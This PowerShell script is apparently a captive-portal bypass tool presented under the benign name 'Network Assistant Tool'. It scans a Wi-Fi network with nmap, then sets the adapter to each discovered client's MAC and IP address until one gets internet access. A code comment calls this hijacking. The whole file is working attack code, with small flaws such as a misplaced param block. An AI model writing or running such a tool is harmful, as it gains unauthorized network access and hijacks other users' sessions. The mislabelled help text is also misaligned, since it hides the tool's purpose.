# --- Logging and Error Handling ---
$DEBUG = $false # Set to $true for verbose debug output via --debug flag
$LOG_FILE = ""

# Function to log messages. Prepends with a timestamp.
function Write-Log {
    param (
        [string]$Type,
        [string]$Message
    )

    if (-not $LOG_FILE) {
        # Don't log until LOG_FILE is set
        return
    }

    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:MM:ss"

    switch ($Type) {
        "INFO" {
            Add-Content -Path $LOG_FILE -Value "[$Timestamp] [INFO]  $Message"
        }
        "WARN" {
            Add-Content -Path $LOG_FILE -Value "[$Timestamp] [WARN]  $Message"
        }
        "ERROR" {
            Add-Content -Path $LOG_FILE -Value "[$Timestamp] [ERROR] $Message"
        }
        "DEBUG" {
            if ($DEBUG) {
                Add-Content -Path $LOG_FILE -Value "[$Timestamp] [DEBUG] $Message"
            }
        }
    }
}

# Helper function to convert CIDR to Subnet Mask
function Convert-CidrToSubnetMask {
    param (
        [int]$Cidr
    )
    if ($Cidr -lt 0 -or $Cidr -gt 32) {
        throw "CIDR value must be between 0 and 32."
    }
    $mask = [System.Net.IPAddress]::Parse("0.0.0.0").GetAddressBytes()
    for ($i = 0; $i -lt $Cidr; $i++) {
        $mask[$i / 8] = $mask[$i / 8] -bor (0x80 -shr ($i % 8))
    }
    return ([string]::Join(".", ($mask | ForEach-Object { $_ })))
}

# Helper function to convert Subnet Mask to CIDR
function Convert-SubnetMaskToCidr {
    param (
        [string]$SubnetMask
    )
    $maskBytes = ($SubnetMask -split '\.') | ForEach-Object { [byte]$_ }
    $cidr = 0
    foreach ($byte in $maskBytes) {
        $cidr += [Convert]::ToString($byte, 2).ToCharArray() | Where-Object { $_ -eq '1' } | Measure-Object -Sum | Select-Object -ExpandProperty Sum
    }
    return $cidr
}

# Helper function to calculate Network Address
function Get-NetworkAddress {
    param (
        [string]$IPAddress,
        [int]$Cidr
    )
    $ipBytes = ($IPAddress -split '\.') | ForEach-Object { [byte]$_ }
    $maskBytes = (Convert-CidrToSubnetMask -Cidr $Cidr -split '\.') | ForEach-Object { [byte]$_ }
    $networkBytes = @()
    for ($i = 0; $i -lt 4; $i++) {
        $networkBytes += ($ipBytes[$i] -band $maskBytes[$i])
    }
    return ([string]::Join(".", $networkBytes))
}

# check if required packages are installed
function Test-RequiredPackages {
    Write-Log -Type "INFO" -Message "Checking for required packages..."
    Write-Host "Checking for required packages..."

    $missingPackages = $false
    $reqs = @("nmap.exe") # sipcalc functionality will be implemented in PowerShell

    foreach ($cmd in $reqs) {
        if (-not (Get-Command -Name $cmd -ErrorAction SilentlyContinue)) {
            Write-Log -Type "ERROR" -Message "Required command '$cmd' is not installed or not in PATH."
            Write-Host "ERROR: Required command '$cmd' is not installed or not in PATH." -ForegroundColor Red
            $missingPackages = $true
        }
    }

    if ($missingPackages) {
        Write-Host "Please install missing packages and restart the script." -ForegroundColor Red
        exit 1
    } else {
        Write-Host "All required packages found."
        Write-Log -Type "INFO" -Message "All required packages found."
    }
}

# Check for running as administrator.
function Test-AdministratorPrivileges {
    Write-Log -Type "INFO" -Message "Checking for administrator privileges..."
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Log -Type "ERROR" -Message "This script must be run as administrator."
        Write-Host "ERROR: This script must be run as administrator." -ForegroundColor Red
        exit 1
    }
    Write-Log -Type "INFO" -Message "Running with administrator privileges."
}

# Set any network parameters that were not provided via arguments
function Set-DefaultNetworkParameters {
    Write-Log -Type "INFO" -Message "Setting default network parameters for any missing values..."

    # Determine default interface
    if (-not $script:iface) {
        $script:iface = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Where-Object { $_.InterfaceAlias -ne $null } | Select-Object -ExpandProperty InterfaceAlias -First 1)
        if (-not $script:iface) {
            Write-Log -Type "ERROR" -Message "Could not determine network interface. Please specify with -Iface."
            Write-Host "ERROR: Could not determine network interface. Please specify with -Iface." -ForegroundColor Red
            exit 1
        }
    }

    # Get IP Address and PrefixLength (CIDR)
    $ipAddressInfo = Get-NetIPAddress -InterfaceAlias $script:iface -AddressFamily IPv4 | Select-Object -First 1
    if ($ipAddressInfo) {
        if (-not $script:ip) { $script:ip = $ipAddressInfo.IPAddress }
        if (-not $script:nmask) { $script:nmask = $ipAddressInfo.PrefixLength }
        if (-not $script:ipmask) { $script:ipmask = "$($ipAddressInfo.IPAddress)/$($ipAddressInfo.PrefixLength)" }
    }

    # Get Gateway
    if (-not $script:gw) {
        $script:gw = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Where-Object { $_.InterfaceAlias -eq $script:iface }).NextHop
    }

    # Get MAC Address
    if (-not $script:macadd) {
        $script:macadd = (Get-NetAdapter -Name $script:iface).MacAddress
    }

    # Get SSID (for Wi-Fi adapters)
    if (-not $script:ssid) {
        $connectionProfile = Get-NetConnectionProfile | Where-Object { $_.InterfaceAlias -eq $script:iface }
        if ($connectionProfile -and $connectionProfile.NetworkCategory -eq 'Public' -or $connectionProfile.NetworkCategory -eq 'Private') { # Assuming these categories imply a connected network
            $script:ssid = $connectionProfile.Name
        }
    }

    # Calculate Broadcast Address if not provided
    if (-not $script:bcast -and $script:ip -and $script:nmask) {
        try {
            $ipBytes = ($script:ip -split '\.') | ForEach-Object { [byte]$_ }
            $maskBytes = (Convert-CidrToSubnetMask -Cidr $script:nmask -split '\.') | ForEach-Object { [byte]$_ }
            $broadcastBytes = @()
            for ($i = 0; $i -lt 4; $i++) {
                $broadcastBytes += ($ipBytes[$i] -bor (-bnot $maskBytes[$i]))
            }
            $script:bcast = ([string]::Join(".", $broadcastBytes))
        } catch {
            Write-Log -Type "WARN" -Message "Could not calculate broadcast address: $($_.Exception.Message)"
        }
    }

    # Calculate Network Address and Network (CIDR)
    if ($script:ip -and $script:nmask) {
        if (-not $script:netadd) {
            $script:netadd = Get-NetworkAddress -IPAddress $script:ip -Cidr $script:nmask
        }
        if (-not $script:nwork) {
            $script:nwork = "$($script:netadd)/$($script:nmask)"
        }
    }
    
    # Exit if we couldn't determine the interface (redundant check, but good for safety)
    if (-not $script:iface) {
        Write-Log -Type "ERROR" -Message "Could not determine network interface. Please specify with -Iface."
        Write-Host "ERROR: Could not determine network interface. Please specify with -Iface." -ForegroundColor Red
        exit 1
    }

    Write-Log -Type "DEBUG" -Message "---Network Parameters---"
    Write-Log -Type "DEBUG" -Message "Interface:      $($script:iface)"
    Write-Log -Type "DEBUG" -Message "SSID:             $($script:ssid)"
    Write-Log -Type "DEBUG" -Message "IP Address:       $($script:ip)"
    Write-Log -Type "DEBUG" -Message "IP with Mask:     $($script:ipmask)"
    Write-Log -Type "DEBUG" -Message "Gateway:          $($script:gw)"
    Write-Log -Type "DEBUG" -Message "MAC Address:      $($script:macadd)"
    Write-Log -Type "DEBUG" -Message "Broadcast:        $($script:bcast)"
    Write-Log -Type "DEBUG" -Message "Netmask (CIDR):   $($script:nmask)"
    Write-Log -Type "DEBUG" -Message "Network Address:  $($script:netadd)"
    Write-Log -Type "DEBUG" -Message "Network (CIDR):   $($script:nwork)"
    Write-Log -Type "DEBUG" -Message "--------------------------"
}

# Split up big networks into smaller chunks of /24.
function Calc-Network {
    Write-Log -Type "INFO" -Message "Calculating network ranges for '$($script:ssid)' hotspot."
    Write-Host "Exploring network...Currently connected to ""$($script:ssid)"""

    $networkListFile = Join-Path $script:tmp "networklist.txt"

    if ($script:nmask -lt 24) {
        Write-Log -Type "INFO" -Message "Splitting up network $($script:nwork) into smaller /24 chunks."
        Write-Host "Network $($script:nwork) is too large; splitting into smaller chunks."

        $networkParts = $script:nwork -split '/'
        $baseIp = $networkParts[0]
        $originalCidr = [int]$networkParts[1]

        # Convert the base IP to a 32-bit integer for easier manipulation
        $ipBytes = [System.Net.IPAddress]::Parse($baseIp).GetAddressBytes()
        $ipInt = ($ipBytes[0] -shl 24) + ($ipBytes[1] -shl 16) + ($ipBytes[2] -shl 8) + $ipBytes[3]

        # Calculate the network address (mask out host bits)
        $maskInt = -1 -shl (32 - $originalCidr)
        $networkInt = $ipInt -band $maskInt

        # Loop from the start of the network to the end, in /24 increments
        # The /24 mask is 0xFFFFFF00 (255.255.255.0)
        for ($currentSubnetInt = $networkInt; $currentSubnetInt -lt ($networkInt + (1 -shl (32 - $originalCidr))); $currentSubnetInt += (1 -shl (32 - 24))) {
            # Convert the 32-bit integer back to an IP address string
            $subnetIpBytes = @(
                ($currentSubnetInt -shr 24) -band 0xFF,
                ($currentSubnetInt -shr 16) -band 0xFF,
                ($currentSubnetInt -shr 8) -band 0xFF,
                $currentSubnetInt -band 0xFF
            )
            $subnetIp = [string]::Join(".", $subnetIpBytes)
            Add-Content -Path $networkListFile -Value $subnetIp
        }
    } else {
        Add-Content -Path $networkListFile -Value ($script:nwork -split '/')[0]
        Write-Log -Type "INFO" -Message "Network $($script:nwork) is a /24 or smaller, no split needed."
    }
}

function Get-RouterMac {
    Write-Log -Type "INFO" -Message "Attempting to find MAC address for gateway $($script:gw)..."
    
    $nmapOutput = (nmap -n -sn -PR -PS -PA -PU -T5 "$script:gw" | Out-String)
    $macMatch = $nmapOutput | Select-String -Pattern '([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})'

    if ($macMatch) {
        $script:getroutermac = $macMatch.Matches[0].Value.ToLower()
        Write-Log -Type "INFO" -Message "Gateway MAC address found: $($script:getroutermac)"
    } else {
        Write-Log -Type "WARN" -Message "Could not determine MAC address for gateway $($script:gw). This may affect network configuration."
    }
}

# Select network, scan it for IP and MAC and hijack them. Repeat.
function Invoke-MainLogic {
    $networkListFile = Join-Path $script:tmp "networklist.txt"
    $hostsaliveFile = Join-Path $script:tmp "hostsalive.txt"

    Get-Content -Path $networkListFile | ForEach-Object {
        $networkfromlist = $_
        $network = "$networkfromlist/$script:nmask"

        Write-Log -Type "INFO" -Message "Scanning for active hosts in $network..."
        Write-Host "Scanning for active hosts in $network. Please wait..."

        # Clear previous hosts alive file
        if (Test-Path $hostsaliveFile) {
            Remove-Item -Path $hostsaliveFile -Force -ErrorAction SilentlyContinue
        }

        # Run nmap
        # The regex for parsing nmap output needs to be robust.
        # Example output:
        # Nmap scan report for 192.168.1.100
        # Host is up (0.000s latency).
        # MAC Address: 00:11:22:33:44:55 (Manufacturer)
        $nmapOutput = (nmap -n -sn -PR -PS -PA -PU -T5 --exclude "$script:ip,$script:gw" "$network" | Out-String)

        # Parse nmap output for IP and MAC
        # This regex captures IP and MAC address from nmap's output
        $regex = [regex]'(?s)Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*?MAC Address: (([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))'
        $matches = $regex.Matches($nmapOutput)

        foreach ($match in $matches) {
            $newip = $match.Groups[1].Value
            $newmac = $match.Groups[2].Value.ToLower()

            # Write to hostsalive.txt
            "$newip - $newmac" | Add-Content -Path $hostsaliveFile
        }

        if (-not (Test-Path $hostsaliveFile) -or (Get-Item $hostsaliveFile).Length -eq 0) {
            Write-Log -Type "WARN" -Message "No active hosts found in network $network."
            Write-Host "No active hosts found on $network for SSID ""$($script:ssid)"""
            continue
        }

        Get-Content -Path $hostsaliveFile | ForEach-Object {
            $hostline = $_
            $parts = $hostline -split ' - '
            $newip = $parts[0]
            $newmac = $parts[1]

            if ($script:getroutermac -ne $newmac) {
                Write-Host "Attempting to configure interface with IP: $newip and MAC: $newmac for SSID: $($script:ssid)"
                Write-Log -Type "INFO" -Message "Attempting to configure interface with IP: $newip and MAC: $newmac"

                try {
                    # Disable adapter
                    Disable-NetAdapter -Name $script:iface -Confirm:$false -ErrorAction Stop
                    Write-Log -Type "DEBUG" -Message "Disabled interface $($script:iface)."

                    # Set MAC address
                    # Note: Set-NetAdapter -MacAddress changes the administratively configured MAC.
                    # Operational MAC might require adapter restart or registry modification.
                    Set-NetAdapter -Name $script:iface -MacAddress $newmac -ErrorAction Stop
                    Write-Log -Type "DEBUG" -Message "Set MAC address to $newmac."

                    # Enable adapter
                    Enable-NetAdapter -Name $script:iface -Confirm:$false -ErrorAction Stop
                    Write-Log -Type "DEBUG" -Message "Enabled interface $($script:iface)."

                    # Remove existing IP addresses
                    Get-NetIPAddress -InterfaceAlias $script:iface -AddressFamily IPv4 | Remove-NetIPAddress -Confirm:$false -ErrorAction SilentlyContinue
                    Write-Log -Type "DEBUG" -Message "Flushed IP addresses from $($script:iface)."

                    # Add new IP address and default gateway
                    New-NetIPAddress -InterfaceAlias $script:iface -IPAddress $newip -PrefixLength $script:nmask -DefaultGateway $script:gw -ErrorAction Stop
                    Write-Log -Type "DEBUG" -Message "Added IP $newip/$($script:nmask) to $($script:iface)."

                    # Remove existing default routes for this interface (if any)
                    Get-NetRoute -DestinationPrefix "0.0.0.0/0" -InterfaceAlias $script:iface | Remove-NetRoute -Confirm:$false -ErrorAction SilentlyContinue
                    # Add new default route
                    New-NetRoute -DestinationPrefix "0.0.0.0/0" -NextHop $script:gw -InterfaceAlias $script:iface -ErrorAction Stop
                    Write-Log -Type "DEBUG" -Message "Added default route via $($script:gw)."

                    Start-Sleep -Seconds 1
        
                    Write-Log -Type "DEBUG" -Message "Network configured. Pinging 8.8.8.8 to test connectivity..."
                    if (Test-Connection -TargetName 8.8.8.8 -Count 1 -Quiet) {
                        Write-Log -Type "INFO" -Message "SUCCESS! Network connection established with IP: $newip and MAC: $newmac."
                        Write-Host ""
                        Write-Host "Configuring network with IP: $newip and MAC: $newmac"
                        Write-Host "Attempting to establish connection to ""$($script:ssid)"" with IP: $newip and MAC: $newmac..."
                        Write-Host "Attempting to communicate with Gateway ($($script:gw))..."
                        Write-Host "Network connection established."
                        Write-Host ""
                        Write-Host "Network configuration successful."
                        Write-Host "Connected to ""$($script:ssid)"" with IP: $newip | MAC: $newmac"
                        Write-Host ""
                        Write-Host "Cleaning up temporary files..."
                        Write-Host "Terminating script and preserving network connectivity."
                        exit 0
                    } else {
                        Write-Log -Type "INFO" -Message "Network configuration with $($script:ssid) as $newip FAILED."
                    }
                } catch {
                    Write-Log -Type "ERROR" -Message "Error configuring network: $($_.Exception.Message)"
                    Write-Host "ERROR: Failed to configure network with IP: $newip and MAC: $newmac. $($_.Exception.Message)" -ForegroundColor Red
                }
            } else {
                Write-Log -Type "INFO" -Message "Skipped IP: $newip - MAC: $newmac (matches gateway MAC)."
            }
        }
        Remove-Item -Path $hostsaliveFile -ErrorAction SilentlyContinue
        Write-Log -Type "INFO" -Message "Finished checking hosts in this network chunk."
    }

    Write-Log -Type "WARN" -Message "No suitable network configurations found across all scanned networks."
    Write-Host "No suitable network configurations found. Restoring original settings."

    # Restore original MAC and IP.
    Write-Log -Type "INFO" -Message "Restoring original network configuration..."
    try {
        # Disable adapter
        Disable-NetAdapter -Name $script:iface -Confirm:$false -ErrorAction Stop

        # Set original MAC address
        Set-NetAdapter -Name $script:iface -MacAddress $script:macadd -ErrorAction Stop

        # Enable adapter
        Enable-NetAdapter -Name $script:iface -Confirm:$false -ErrorAction Stop

        # Remove existing IP addresses
        Get-NetIPAddress -InterfaceAlias $script:iface -AddressFamily IPv4 | Remove-NetIPAddress -Confirm:$false -ErrorAction SilentlyContinue

        # Add original IP address and default gateway
        $originalIp = ($script:ipmask -split '/')[0]
        New-NetIPAddress -InterfaceAlias $script:iface -IPAddress $originalIp -PrefixLength $script:nmask -DefaultGateway $script:gw -ErrorAction Stop

        # Remove existing default routes for this interface (if any)
        Get-NetRoute -DestinationPrefix "0.0.0.0/0" -InterfaceAlias $script:iface | Remove-NetRoute -Confirm:$false -ErrorAction SilentlyContinue
        # Add original default route
        New-NetRoute -DestinationPrefix "0.0.0.0/0" -NextHop $script:gw -InterfaceAlias $script:iface -ErrorAction Stop

        Write-Log -Type "INFO" -Message "Original network settings restored."
    } catch {
        Write-Log -Type "ERROR" -Message "Error restoring original network configuration: $($_.Exception.Message)"
        Write-Host "ERROR: Failed to restore original network configuration. $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Global variables for network parameters
$script:ssid = $null
$script:iface = $null
$script:gw = $null
$script:ip = $null
$script:bcast = $null
$script:nmask = $null
$script:ipmask = $null
$script:nwork = $null
$script:macadd = $null
$script:netadd = $null

# Argument parsing
param (
    [switch]$Help,
    [switch]$Debug,
    [string]$SSID,
    [string]$Iface,
    [string]$Gateway,
    [string]$LocalIP,
    [string]$Broadcast,
    [string]$Netmask,
    [string]$IPMask,
    [string]$Network,
    [string]$MACAddress,
    [string]$NetAddress
)

# --- Main Script Logic ---

# Create a temporary folder for script work.
function Create-Temp {
    $script:tmp = Join-Path $env:TEMP "hackaptive_$(Get-Random)"
    try {
        New-Item -Path $script:tmp -ItemType Directory -ErrorAction Stop | Out-Null
        $script:LOG_FILE = Join-Path $script:tmp "script.log"
        Write-Log -Type "INFO" -Message "Temporary directory created at $script:tmp"
        Write-Log -Type "INFO" -Message "Log file is $script:LOG_FILE"
    } catch {
        Write-Host "ERROR: Unable to create temporary folder. Aborting." -ForegroundColor Red
        exit 1 # No log function here, as it's a fundamental failure
    }
}

# Clean tmp/ on exit due to any reason.
function Clean-Up {
    Write-Log -Type "INFO" -Message "Cleaning up temporary files..."
    # Keep tmp dir if in debug mode for inspection
    if (-not $script:DEBUG) {
        Remove-Item -Path $script:tmp -Recurse -Force -ErrorAction SilentlyContinue
    } else {
        Write-Log -Type "INFO" -Message "Debug mode is on. Temporary directory preserved at $script:tmp"
    }
}

# Register Clean-Up function to run on script exit
Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
    if ($script:tmp) {
        Clean-Up
    }
} | Out-Null # Suppress event registration output

# Main execution flow

# Create temp dir and log file first
Create-Temp

# Set debug mode if --debug switch is present
if ($Debug) {
    $script:DEBUG = $true
    Write-Log -Type "INFO" -Message "Debug mode is enabled."
}

# Handle help switch
if ($Help) {
    Write-Host "net_assist.ps1 - Network Assistant Tool - A utility for network configuration and troubleshooting."
    Write-Host ""
    Write-Host "Usage: `".\net_assist.ps1`" [parameters]"
    Write-Host ""
    Write-Host "Parameters:"
    Write-Host ""
    Write-Host "-Help           ......... Show this help menu"
    Write-Host "-Debug          ......... Enable debug logging"
    Write-Host "-SSID <name>    ......... WiFi SSID"
    Write-Host "-Iface <name>   ......... Network Interface"
    Write-Host "-Gateway <ip>   ......... Network Gateway"
    Write-Host "-LocalIP <ip>   ......... Local IP address"
    Write-Host "-Broadcast <ip> ......... Broadcast IP"
    Write-Host "-Netmask <cidr> ......... Network Mask (CIDR, e.g. 24)"
    Write-Host "-IPMask <ip/cidr> ... IP with Mask (e.g. 192.168.1.10/24)"
    Write-Host "-Network <net/cidr> ... Network (e.g. 192.168.1.0/24)"
    Write-Host "-MACAddress <mac> ... Your original MAC Address"
    Write-Host "-NetAddress <ip> ... Network Address (e.g. 192.168.1.0)"
    exit 0
}

Write-Log -Type "INFO" -Message "Network Assistant Script Started (Windows PowerShell)."

# Run pre-flight checks
Write-Log -Type "DEBUG" -Message "Preparing interface for network analysis...."
Test-RequiredPackages
Test-AdministratorPrivileges

# Assign parsed arguments to global variables
$script:ssid = $SSID
$script:iface = $Iface
$script:gw = $Gateway
$script:ip = $LocalIP
$script:bcast = $Broadcast
$script:nmask = $Netmask
$script:ipmask = $IPMask
$script:nwork = $Network
$script:macadd = $MACAddress
$script:netadd = $NetAddress

# Set any missing network parameters
Write-Log -Type "DEBUG" -Message "Setting default network parameters for any missing values..."
Set-DefaultNetworkParameters

# Run the main logic
Calc-Network
Get-RouterMac
Invoke-MainLogic

# Placeholder for other functions
# required
# check_sudo
# set_defaults
# get_router_mac
# calc_network
# main

Write-Log -Type "INFO" -Message "Script finished."
exit 0
